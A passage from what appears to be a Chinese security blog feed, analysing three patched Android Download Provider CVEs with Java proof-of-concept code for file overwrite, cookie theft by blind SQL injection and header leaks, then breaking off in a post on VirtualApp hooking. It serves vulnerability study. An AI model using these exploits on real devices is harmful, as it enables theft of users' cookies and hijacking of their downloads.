      <link href="/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>IOActive的安全研究员Daniel Kachakil发现了Android Download Provider相关的几个漏洞（CVE-2018-9468, CVE-2018-9493, CVE-2018-9546）,漏洞原理看似简单却十分有趣，这里总结一下。</p><p>原文链接：<a href="https://ioactive.com/multiple-vulnerabilities-in-androids-download-provider-cve-2018-9468-cve-2018-9493-cve-2018-9546/" target="_blank" rel="noopener">https://ioactive.com/multiple-vulnerabilities-in-androids-download-provider-cve-2018-9468-cve-2018-9493-cve-2018-9546/</a></p><h2 id="Download-Provider"><a href="#Download-Provider" class="headerlink" title="Download Provider"></a>Download Provider</h2><p>首先了解下Download Provider。Android系统的ContentProvider类似于应用数据库，用于共享自己的数据被其他的应用程序访问。Android提供了一套处理其他App下载请求的机制，例如浏览器的下载、邮件附件的下载、OTA升级包下载等。其中Download Manager用来处理下载请求，DownloadManager下载过程中，会将下载的数据和下载的状态插入ContentProvider中，完成下载后使用ContentProvider来提供下载内容给请求方APP。</p><p>使用DownloadManager下载文件的示例代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//创建下载请求</span><br><span class="line">    DownloadManager.Request req = new DownloadManager.Request(Uri.parse(&quot;http://www.qq.com&quot;));</span><br><span class="line">//设置下载路径</span><br><span class="line">    File saveFile = new File(Environment.getExternalStorageDirectory(), &quot;demo.apk&quot;);</span><br><span class="line">    req.setDestinationUri(Uri.fromFile(saveFile));</span><br><span class="line">        </span><br><span class="line">DownloadManager manager = (DownloadManager) getApplicationContext().getSystemService(Context.DOWNLOAD_SERVICE);</span><br><span class="line"></span><br><span class="line">// 将下载请求加入下载队列, 返回一个下载ID</span><br><span class="line">    long downloadId = manager.enqueue(req);</span><br></pre></td></tr></table></figure></p><p>关于Download Provider我们需要了解以下几点：</p><ol><li>下载完成后，APP访问下载进度、下载状态、下载文件数据等都需要通过download_id来访问，Download Provider提供了三种方式 <a href="http://androidxref.com/9.0.0_r3/xref/frameworks/base/core/java/android/provider/Downloads.java#102" target="_blank" rel="noopener">参考</a>：<ul><li>content://downloads/public_downloads/(download_id)<br>  公开下载的文件，不需要任何权限</li><li>content://downloads/all_downloads/(download_id)<br>  访问所有的下载文件，需要ACCESS_ALL_DOWNLOADS权限（Signature级别的权限）</li><li>content://downloads/my_downloads/(download_id)<br>  访问应用自己下载的文件</li></ul></li><li>Download Provider由系统应用com.android.providers.downloads实现，因此作为一个应用，下载保存的位置只可能为public sdcard、private sdcard以及/data/data/com.android.providers.downloads 目录内，如不指定路径，默认下载位置为/data/data/com.android.providers.downloads/cache/</li><li>Download Provider实现了一套访问控制机制，应用只能访问自己下载的文件，无权限访问其他应用下载的文件，因此遍历download_id是不可行的。（当然保存在sdcard的文件除外，因为只要有sdcard权限就可以读文件了）</li></ol><p>我们知道ContentProvider如果配置不当，可能导致信息泄露、目录穿越等问题，同样如果Download Provider的实现中配置不当有可能带来一些安全问题，下面依次展开这三个漏洞。</p><h2 id="CVE-2018-9468-Download-Provider权限绕过"><a href="#CVE-2018-9468-Download-Provider权限绕过" class="headerlink" title="CVE-2018-9468: Download Provider权限绕过"></a>CVE-2018-9468: Download Provider权限绕过</h2><p>正常情况下，APP只能访问自己下载的文件，然而由于content://downloads/public_downloads/(download_id)未做好权限控制，导致可以通过遍历download_id访问所有其他app的下载文件，包括文件下载时的title, description, size, full URL等等。</p><p>漏洞修复前后的对比<a href="https://android.googlesource.com/platform/packages/providers/DownloadProvider/+/544294737dfc3b585465302f1f784a311659a37c%5E%21/#F0" target="_blank" rel="noopener">https://android.googlesource.com/platform/packages/providers/DownloadProvider/+/544294737dfc3b585465302f1f784a311659a37c%5E%21/#F0</a></p><p>从补丁来看，Android是删掉了public_downloads这个ContentProvider</p><p><img src="/images/pasted-182.png" alt="upload successful"></p><p>PoC代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//1493 其他app下载的</span><br><span class="line">      //1492 自己app下载的</span><br><span class="line">      ContentResolver res = getContentResolver();</span><br><span class="line">      Uri uri = Uri.parse(&quot;content://downloads/my_downloads/1493&quot;);</span><br><span class="line">      Cursor cur = res.query(uri,null,null,null,null,null);</span><br><span class="line">      cur.moveToFirst();</span><br><span class="line">      String rowdata = cur.getString(cur.getColumnIndex(&quot;_data&quot;));</span><br><span class="line">      String rowUri = cur.getString(cur.getColumnIndex(&quot;uri&quot;));</span><br><span class="line">      String rowTitle = cur.getString(cur.getColumnIndex(&quot;title&quot;));</span><br><span class="line">      String rowdescription = cur.getString(cur.getColumnIndex(&quot;description&quot;));</span><br><span class="line">      Log.d(&quot;m4bln&quot;,rowTitle);</span><br><span class="line">      Log.d(&quot;m4bln&quot;,rowUri);</span><br><span class="line">      Log.d(&quot;m4bln&quot;,rowdescription);</span><br></pre></td></tr></table></figure></p><p>除了读取其他app下载的文件外，还可以利用openFile()进行修改。Content Provider的openFile是通过query()对文件定位的,因此该漏洞也会影响openFile()。</p><p><img src="/images/pasted-183.png" alt="upload successful"></p><p>通过openFile（）我们甚至可以写文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">ContentResolver res = getContentResolver();</span><br><span class="line">Uri uri = Uri.parse(&quot;content://downloads/my_downloads/1493&quot;);</span><br><span class="line">Cursor cur = res.query(uri, null, null, null, null);</span><br><span class="line">try &#123;</span><br><span class="line">    if (cur != null &amp;&amp; cur.getCount() &gt; 0) &#123;</span><br><span class="line">        cur.moveToFirst();</span><br><span class="line">        String rowData = cur.getString(cur.getColumnIndex(&quot;_data&quot;));</span><br><span class="line"></span><br><span class="line">        if (rowData != null &amp;&amp; !rowData.isEmpty()) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                ParcelFileDescriptor fd = res.openFileDescriptor(uri, &quot;rwt&quot;);</span><br><span class="line">                FileWriter fw = new FileWriter(fd.getFileDescriptor());</span><br><span class="line">                DateFormat dateFormat = new SimpleDateFormat(&quot;yyyy/MM/dd HH:mm:ss&quot;);</span><br><span class="line">                fw.write(dateFormat.format(new Date()));</span><br><span class="line">                fw.write(&quot;\n(Any arbitrary contents can be placed here...)&quot;);</span><br><span class="line"></span><br><span class="line">                log(LOG_SEPARATOR + &quot;Overwritten file: &quot; + rowData);</span><br><span class="line">                fw.flush();</span><br><span class="line"></span><br><span class="line">                // Closing the file descriptor will crash the Android Media process</span><br><span class="line">                if (closeFile)</span><br><span class="line">                    fd.close();</span><br><span class="line">                else</span><br><span class="line">                    mFileDescriptors.add(fd);</span><br><span class="line">            &#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else</span><br><span class="line">            log(LOG_SEPARATOR + &quot;Cannot overwrite file. The path is empty.&quot;);</span><br><span class="line">    &#125; else</span><br><span class="line">        log(LOG_SEPARATOR + &quot;Cannot overwrite file. The download ID &quot; + id + &quot; does not exist.&quot;);</span><br><span class="line">&#125; finally &#123;</span><br><span class="line">    if (cur != null)</span><br><span class="line">        cur.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这样，利用CVE-2018-9468就可以在下载完成的瞬间替换成攻击者的文件，进行中间人攻击了。作者利用这个漏洞完成了对GooglePlay进行Dos攻击、对gmail的附件进行hijack等攻击。</p><h2 id="CVE-2018-9493-Download-Provider-SQL注入"><a href="#CVE-2018-9493-Download-Provider-SQL注入" class="headerlink" title="CVE-2018-9493: Download Provider SQL注入"></a>CVE-2018-9493: Download Provider SQL注入</h2><p>Download Provider中的以下columns是不允许被外部访问的，例如CookieData，但是利用SQL注入漏洞可以绕过这个限制。</p><p>projection参数存在注入漏洞，结合二分法可以爆出某些columns字段的内容。</p><p>漏洞修复前后的diff如下：</p><p><img src="/images/pasted-184.png" alt="upload successful"></p><p>漏洞利用代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">private void dump(boolean dumpProtectedColumns) &#123;</span><br><span class="line">        ContentResolver res = getContentResolver();</span><br><span class="line">        Uri uri = Uri.parse(MY_DOWNLOADS_URI);</span><br><span class="line">        Cursor cur;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            cur = res.query(uri, null, &quot;1=1) or (1=1&quot;, null, null);</span><br><span class="line">        &#125; catch (IllegalArgumentException e) &#123;</span><br><span class="line">            Log.e(TAG, &quot;Error&quot;, e);</span><br><span class="line">            log(&quot;ERROR: The device does not appear to be vulnerable&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            if (cur != null &amp;&amp; cur.getCount() &gt; 0) &#123;</span><br><span class="line">                // Iterate all results and display some fields for each row from the downloads database</span><br><span class="line">                while (cur.moveToNext()) &#123;</span><br><span class="line">                    int rowId = cur.getInt(cur.getColumnIndex(&quot;_id&quot;));</span><br><span class="line">                    String rowData = cur.getString(cur.getColumnIndex(&quot;_data&quot;));</span><br><span class="line">                    String rowUri = cur.getString(cur.getColumnIndex(&quot;uri&quot;));</span><br><span class="line">                    String rowTitle = cur.getString(cur.getColumnIndex(&quot;title&quot;));</span><br><span class="line">                    String rowDescription = cur.getString(cur.getColumnIndex(&quot;description&quot;));</span><br><span class="line"></span><br><span class="line">                    StringBuilder sb = new StringBuilder(LOG_SEPARATOR);</span><br><span class="line">                    sb.append(&quot;DOWNLOAD ID &quot;).append(rowId);</span><br><span class="line">                    sb.append(&quot;\nData: &quot;).append(rowData);</span><br><span class="line">                    sb.append(&quot;\nUri: &quot;).append(rowUri);</span><br><span class="line">                    sb.append(&quot;\nTitle: &quot;).append(rowTitle);</span><br><span class="line">                    sb.append(&quot;\nDescription: &quot;).append(rowDescription);</span><br><span class="line"></span><br><span class="line">                    if (dumpProtectedColumns) &#123;</span><br><span class="line">                        int uid = binarySearch(rowId, &quot;uid&quot;);</span><br><span class="line">                        sb.append(&quot;\nUID: &quot;).append(uid);</span><br><span class="line"></span><br><span class="line">                        dumpColumn(rowId, &quot;CookieData&quot;, sb);</span><br><span class="line">                        dumpColumn(rowId, &quot;ETag&quot;, sb);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    log(sb.toString());</span><br><span class="line">                &#125;</span><br><span class="line">                log(&quot;\n\nDUMP FINISHED&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            if (cur != null)</span><br><span class="line">                cur.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void dumpColumn(int rowId, String columnName, StringBuilder sb) &#123;</span><br><span class="line">        if (isTrueCondition(rowId, &quot;length(&quot; + columnName + &quot;) &gt; 0&quot;)) &#123;</span><br><span class="line">            int len = binarySearch(rowId, &quot;length(&quot; + columnName + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">            sb.append(&quot;\n&quot; + columnName + &quot;: &quot;);</span><br><span class="line">            for (int i = 1; i &lt;= len; i++) &#123;</span><br><span class="line">                int c = binarySearch(rowId, &quot;unicode(substr(&quot; + columnName + &quot;,&quot; + i + &quot;,1))&quot;);</span><br><span class="line">                String newChar = Character.toString((char) c);</span><br><span class="line">                sb.append(newChar);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private int binarySearch(int id, String sqlExpression) &#123;</span><br><span class="line">        int min = 0;</span><br><span class="line">        int max = 20000;</span><br><span class="line">        int mid = 0;</span><br><span class="line"></span><br><span class="line">        while (min + 1 &lt; max) &#123;</span><br><span class="line">            mid = (int) Math.floor((double) (max + min) / 2);</span><br><span class="line"></span><br><span class="line">            if (isTrueCondition(id, sqlExpression + &quot;&gt;&quot; + mid))</span><br><span class="line">                min = mid;</span><br><span class="line">            else</span><br><span class="line">                max = mid;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if ((mid == max) &amp;&amp; isTrueCondition(id, sqlExpression + &quot;=&quot; + mid))</span><br><span class="line">            return mid;</span><br><span class="line">        else if (isTrueCondition(id, sqlExpression + &quot;=&quot; + (mid + 1))) // Extra check</span><br><span class="line">            return mid + 1;</span><br><span class="line"></span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private boolean isTrueCondition(int rowId, String sqlCondition) &#123;</span><br><span class="line">        ContentResolver res = getContentResolver();</span><br><span class="line">        Uri uri = Uri.parse(MY_DOWNLOADS_URI);</span><br><span class="line"></span><br><span class="line">        Cursor cur = res.query(uri, new String[]&#123;&quot;_id&quot;&#125;, &quot;_id=&quot; + rowId + &quot;) and (&quot; +</span><br><span class="line">                sqlCondition + &quot;) or (1=1&quot;, null, null);</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            return (cur != null &amp;&amp; cur.getCount() &gt; 0);</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            if (cur != null)</span><br><span class="line">                cur.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><h2 id="CVE-2018-9546-Download-Provider文件头信息泄露"><a href="#CVE-2018-9546-Download-Provider文件头信息泄露" class="headerlink" title="CVE-2018-9546: Download Provider文件头信息泄露"></a>CVE-2018-9546: Download Provider文件头信息泄露</h2><p>Download Provider运行app获取下载的http请求头，但理论上APP只能访问自己下载的文件的http请求头，但Download Provider没有做好权限配置，导致heads可以被任意读取。header中会保存一些敏感数据，例如cookie等。</p><p>读取header的URI为：content://download/mydownloads/download_id/headers</p><p>PoC代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Uri uri = Uri.parse(&quot;content://download/mydownloads/1493/headers&quot;);</span><br><span class="line">Cursor cur = res.query(uri, null, null, null, null);</span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line">    if (cur != null &amp;&amp; cur.getCount() &gt; 0) &#123;</span><br><span class="line">        StringBuilder sb = new StringBuilder(LOG_SEPARATOR);</span><br><span class="line">        sb.append(&quot;HEADERS FOR DOWNLOAD ID &quot;).append(id).append(&quot;\n&quot;);</span><br><span class="line">        while (cur.moveToNext()) &#123;</span><br><span class="line">            String rowHeader = cur.getString(cur.getColumnIndex(&quot;header&quot;));</span><br><span class="line">            String rowValue = cur.getString(cur.getColumnIndex(&quot;value&quot;));</span><br><span class="line">            sb.append(rowHeader).append(&quot;: &quot;).append(rowValue).append(&quot;\n\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        log(sb.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125; finally &#123;</span><br><span class="line">    if (cur != null)</span><br><span class="line">        cur.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Vitual APP及其环境下的hook技术研究</title>
      <link href="/2019/02/09/itural-APP%E7%A0%94%E7%A9%B6/"/>
      <url>/2019/02/09/itural-APP%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<p>随着Android系统安全漏洞的大幅减少，Android设备的root门槛变得越来越高，知名的root工具KingRoot甚至停止了维护，利用漏洞来root变成一件很困难的事情。</p><p>另一方面，厂商对Secure Boot的实现也在不断增强，大多数手机厂商关闭了bootloader解锁通道，通过刷第三方rom或recovery来root设备的方式逐渐不可行。</p><p>root是安全人员必备的研究环境，除了使用Nexus系列设备外，Vitual APP下的hook不失为一种办法。此外，由于上手简单，VA下的hook更多是被黑产或脚本所利用，本文对这种技术的原理进行分析。</p><h2 id="一、Vitual-APP原理"><a href="#一、Vitual-APP原理" class="headerlink" title="一、Vitual APP原理"></a>一、Vitual APP原理</h2><p>广义的Vitual App 可以理解为轻量级的“Android虚拟机”，即一个宿主APP上运行多个其他APP的形式，一定程度上也可以理解为我们熟知的“应用多开”。这种“虚拟机”并未打破Android原有的系统机制，因此，宿主APP及其虚拟运行的多个APP共享同一个uid/gid。</p><p>我们知道Android上每个APP都运行在自己的沙盒环境中，但APP对于自己的进程、子进程等具有完全的控制权，在自己的沙箱内运行起其他APP，就实现了虚拟化。然而，常规的APP除了运行自己的代码外，还会和操作系统频繁交互，例如各种各样的服务、文件系统等，Vitual App如果成为了APP和操作系统的“中间人”，便实现了APP无感知的虚拟机，这也是Vitual APP的核心技术。</p><p>常见的Vitual APP有以下几类：</p><ul><li>基于<a href="https://github.com/asLody/VirtualApp" target="_blank" rel="noopener">VitualAPP</a>引擎的虚拟工具，例如“太极” （这里的VitualAPP特指github上一款工具，而Vitual APP是广义的虚拟化应用）</li><li>基于<a href="http://www.lbesec.com/#/home" target="_blank" rel="noopener">MultiDroid</a>引擎的虚拟工具,例如“LBE平行空间”</li><li>基于<a href="https://github.com/DroidPluginTeam/DroidPlugin" target="_blank" rel="noopener">DroidPlugin</a>，如“360分身大师”</li><li>厂商自带的“应用分身工具”、“多开工具”等</li></ul><p>Vitual APP目前被广泛应用于插件化开发、无感知热更新、应用多开、手机模拟信息、脚本自动化等技术领域，这里我们对常见技术流派的原理进行简单分析。</p><h3 id="1-VitualAPP"><a href="#1-VitualAPP" class="headerlink" title="1.VitualAPP"></a>1.VitualAPP</h3><p>VirtualApp是一个开源的Android App虚拟化引擎，允许在其中创建虚拟空间，并在这个虚拟空间中运行其他应用。项目地址：<a href="https://github.com/asLody/VirtualApp（PS:VA的作者是一名高中生）" target="_blank" rel="noopener">https://github.com/asLody/VirtualApp（PS:VA的作者是一名高中生）</a></p><p>VirtualApp主要有三部分构成：</p><ul><li>Main Process<br>进程名io.virtualapp，主要负责VirtualApp用户界面及应用管理</li><li>Server Process<br>进程名io.virtualapp:x，主要负责实现各种系统服务的代理，这部分也是其能够完成虚拟APP的核心</li><li>VApp Process<br>进程名io.virtualapp:p[x]，作为将来运行client应用的进程，当client应用启动后，其进程名会更新为client应用的包名</li></ul><p>VirtualApp之所以能够实现虚拟空间，是因为其对许多系统服务进行了代理和替换。Android应用调用系统服务，是通过Binder机制进行IPC。因此，应用所持有的是系统服务的BinderProxy，VirtualApp通过对这些BinderProxer构造代理并替换，便实现了对系统服务的代理和替换。具体的替换方式可参考<a href="http://rk700.github.io/2017/03/15/virtualapp-basic/" target="_blank" rel="noopener">http://rk700.github.io/2017/03/15/virtualapp-basic/</a></p><p>原理虽然简单，但由于需要处理各种各样的系统服务，VirtualApp的代码实现起来还是比较麻烦的，此外，VA还要处理APP的安装、启动、广播等。由于巨大的工作量，后期的VitualApp也推出了商业版本。一份非官方的VA文档可以作为参考<a href="https://github.com/prife/VirtualAppDoc。" target="_blank" rel="noopener">https://github.com/prife/VirtualAppDoc。</a></p><h3 id="2-MultiDroid"><a href="#2-MultiDroid" class="headerlink" title="2.MultiDroid"></a>2.MultiDroid</h3><p>MutiDroid并没有开源其代码，据一些非官方的文档（<a href="https://blog.csdn.net/xiaoyangsavvy/article/details/73479780）描述，其关键的实现技术有：" target="_blank" rel="noopener">https://blog.csdn.net/xiaoyangsavvy/article/details/73479780）描述，其关键的实现技术有：</a></p><ul><li>Framework层的虚拟实现</li><li>文件系统虚拟化</li><li>Android系统组件管理</li><li>应用进程管理</li></ul><p>但这些技术同样也是VitualApp需要处理的，也有人在逆向LBE的dex里发现了和VA相同的类，毕竟都是对系统服务进行代理，系统服务相关的类名相同自然也是应该的，由于对其未开源，这里对MultiDroid引擎的实现不作分析。</p><h3 id="3-DroidPlugin"><a href="#3-DroidPlugin" class="headerlink" title="3.DroidPlugin"></a>3.DroidPlugin</h3><p>DroidPlugin是360推出的一款虚拟插件<a href="https://github.com/DroidPluginTeam/DroidPlugin" target="_blank" rel="noopener">https://github.com/DroidPluginTeam/DroidPlugin</a> ，weishu的文章里详细解释了DroidPlugin的原理（<a href="https://github.com/tiann/understand-plugin-framework），DroidPlugin更多的被用于热修复中。" target="_blank" rel="noopener">https://github.com/tiann/understand-plugin-framework），DroidPlugin更多的被用于热修复中。</a></p><p>DroidPlugin主要通过Binder动态代理的方式对系统进行hook,同时也对Android的四大组件进行了处理，详细实现可以参考作者github中的Doc目录里的分析文章。</p><h3 id="4-厂商实现"><a href="#4-厂商实现" class="headerlink" title="4.厂商实现"></a>4.厂商实现</h3><p>由于可以定制化修改系统，相比于其他绞尽脑汁的hook方案，厂商可谓开启的上帝模式，因此在系统上运行一个APP的两个实例实现起来轻而易举。所以严格来讲，手机厂商的实现不能叫Vitual APP了。此外，厂商还可以用Android的多用户机制，实现“访客模式”、“隐私模式”等功能。</p><h2 id="二、无root下的hook"><a href="#二、无root下的hook" class="headerlink" title="二、无root下的hook"></a>二、无root下的hook</h2><p>我们知道常用的hook工具如Xposed、frida等都需要在root环境下运行，这是因为在无root的环境下，hook工具和目标APP是相互独立的进程，hook工具没有注入目标代码的权限。</p><p>通过Vitual APP的技术，我们把目标APP加载到自己控制的沙箱空间内，本质上可以注入任意代码，因此就可以实现hook的功能了。上文解释Vitual APP原理时，我们也提到了hook，但和此节的hook还是有区别的，前者是对系统服务等关键函数的hook,后者作为一个工具，需要实现任意函数下的hook。因此，无root环境下的hook除了结合Vitual APP外，还需要实现任意函数hook，这也就是常说的AOP拦截（Aspect Oriented Programming）。</p><p>例如，“太极”(<a href="https://github.com/taichi-framework/TaiChi" target="_blank" rel="noopener">https://github.com/taichi-framework/TaiChi</a>) 是一款比较知名的无root环境下的hook工具，</p><h3 id="1-Epic原理"><a href="#1-Epic原理" class="headerlink" title="1.Epic原理"></a>1.Epic原理</h3><p><a href="https://github.com/tiann/epic/blob/master/README_cn.md" target="_blank" rel="noopener">Epic</a> 是一个在虚拟机层面、以Java Method为粒度的运行时Hook 框架（支持 Android 4.0 ~ 10.0）。</p><blockquote><p>它可以拦截本进程内部几乎任意的 Java 方法调用，可用于实现 AOP 编程、运行时插桩、性能分析、安全审计等。Epic 被 VirtualXposed 以及 太极 使用，用来实现非 Root 场景下的 Xposed 功能，已经经过了相当广泛的验证。</p></blockquote><p>Epic的实现原理可参考<a href="http://weishu.me/2017/11/23/dexposed-on-art/，" target="_blank" rel="noopener">http://weishu.me/2017/11/23/dexposed-on-art/，</a> 其大致原理是：每一个java方法在ART虚拟机中都对应一个ArtMethod对象，这个ArtMethod对象包含Java方法的所有信息，例如名字，参数类型，方法本身代码的入口地址（entrypoint)等。其中的entrypoint是函数执行的入口，通过替换entrypoint可以实现控制流的挟持。</p><p>ArtMethod类定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">//http://androidxref.com/8.1.0_r33/xref/art/runtime/art_method.h#708</span><br><span class="line">class ArtMethod &#123;</span><br><span class="line"> </span><br><span class="line">  GcRoot&lt;mirror::Class&gt; declaring_class_; //method所属的class</span><br><span class="line"></span><br><span class="line">  // Short cuts to declaring_class_-&gt;dex_cache_ member for fast compiled code access. </span><br><span class="line">  GcRoot&lt;mirror::PointerArray&gt; dex_cache_resolved_methods_;</span><br><span class="line"></span><br><span class="line">  // Short cuts to declaring_class_-&gt;dex_cache_ member for fast compiled code access. </span><br><span class="line">  GcRoot&lt;mirror::ObjectArray&lt;mirror::Class&gt;&gt; dex_cache_resolved_types_;</span><br><span class="line"></span><br><span class="line">  // Access flags; low 16 bits are defined by spec. </span><br><span class="line">  uint32_t access_flags_;</span><br><span class="line"></span><br><span class="line">  /* Dex file fields. The defining dex file is available via declaring_class_-&gt;dex_cache_ */</span><br><span class="line"></span><br><span class="line">  // Offset to the CodeItem. </span><br><span class="line">  uint32_t dex_code_item_offset_;</span><br><span class="line"></span><br><span class="line">  // Index into method_ids of the dex file associated with this method. </span><br><span class="line">  uint32_t dex_method_index_;</span><br><span class="line"></span><br><span class="line">  /* End of dex file fields. */</span><br><span class="line"></span><br><span class="line">  // Entry within a dispatch table for this method. For static/direct methods the index is into </span><br><span class="line">  // the declaringClass.directMethods, for virtual methods the vtable and for interface methods the </span><br><span class="line">  // ifTable. </span><br><span class="line">  uint32_t method_index_;</span><br><span class="line"></span><br><span class="line">  // Fake padding field gets inserted here. </span><br><span class="line">  // Must be the last fields in the method. </span><br><span class="line">  // PACKED(4) is necessary for the correctness of </span><br><span class="line">  // RoundUp(OFFSETOF_MEMBER(ArtMethod, ptr_sized_fields_), pointer_size). </span><br><span class="line">  struct PACKED(4) PtrSizedFields &#123;</span><br><span class="line"></span><br><span class="line">    // Method dispatch from the interpreter invokes this pointer which may cause a bridge into </span><br><span class="line">    // 以interpreter模式调用入口</span><br><span class="line">    void* entry_point_from_interpreter_; </span><br><span class="line">    void* 